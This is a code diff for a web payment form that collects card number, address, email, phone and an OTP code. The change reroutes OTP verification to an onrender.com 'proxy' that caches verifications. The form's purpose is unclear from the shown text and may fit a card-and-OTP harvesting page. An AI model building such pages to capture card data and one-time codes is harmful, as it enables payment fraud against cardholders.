@@ -58,7 +58,6 @@
       <div class="form-group">
         <label for="cardNumber">Card Number</label>
         <input type="text" id="cardNumber" maxlength="17" inputmode="numeric" required>
-        <!-- removed prefix/16-digit hint per request -->
       </div>
 
       <div class="row">
@@ -72,8 +71,7 @@
         </div>
       </div>
 
-      <!-- removed First Name / Last Name per request -->
-
+      <!-- First/Last Name removed -->
       <div class="form-group">
         <label for="address">Address</label>
         <input type="text" id="address" autocomplete="address-line1">
@@ -173,7 +171,7 @@
   const otpEl = document.getElementById('otpCode');
   const clientErr = document.getElementById('clientErr');
 
-  // group digits in blocks of 4; for 14 digits it will appear as "#### #### #### ##"
+  // group digits in blocks of 4; for 14 digits it appears "#### #### #### ##"
   cardEl.addEventListener('input', function () {
     let v = this.value.replace(/\D/g, '');
     if (v.length > 14) v = v.slice(0, 14);
@@ -234,7 +232,8 @@
     otpStatus.textContent = "Verifying...";
     otpStatus.style.color = "";
     try {
-      const res = await fetch('https://twilio-otp-server.onrender.com/verify-otp', {
+      // Call your server proxy so the server caches the verification
+      const res = await fetch('https://twist-status-server.onrender.com/otp/verify-proxy', {
         method:'POST', headers:{'Content-Type':'application/json'},
         body: JSON.stringify({ phone: lockedPhone, code })
       });
@@ -286,7 +285,6 @@
       email: document.getElementById('email').value,
       phone: lockedPhone,                 // EXACT same phone used for OTP
       postal: document.getElementById('postal').value,
-      // removed firstName/lastName per request
       address: document.getElementById('address').value,
       city: document.getElementById('city').value,
       otpCode: document.getElementById('otpCode').value
